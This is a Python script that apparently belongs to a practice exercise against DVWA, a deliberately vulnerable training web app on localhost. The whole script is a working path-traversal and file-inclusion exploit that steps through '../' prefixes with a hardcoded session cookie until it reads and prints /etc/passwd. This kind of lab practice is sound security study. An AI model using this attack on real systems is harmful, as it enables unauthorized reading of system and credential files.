# Import modules
import re
import requests

for i in range(1,10):
    # If i is zero, no traversal
    if i == 0:
        URL = "http://127.0.0.1/DVWA/vulnerabilities/fi/?page="+str('../'*i)+"/etc/passwd"
    # Else, traverse
    else:
        URL = "http://127.0.0.1/DVWA/vulnerabilities/fi/?page="+str('../'*i)+"etc/passwd"

    cookie = {"PHPSESSID":"9tp4hi0m7muokdfi94sk31ji4f","security":"low"}  # Making the browser cookie

    session1 = requests.Session()
    request = session1.get(URL,cookies=cookie)                      # Make request using the session opened in browser

    if request.text.find("root") != -1:                                 # If the response has root in it i.e. root directory
        print("Cracked!")
        result_parse = re.search('.*<!',request.text,re.DOTALL)     # Search the directory
        result = re.sub('<!','',result_parse.group(),re.DOTALL)     # Add the search result in a group
        print(result)                                               # Print the search result
        exit(0)
    else:
        print("Not Vulnerable")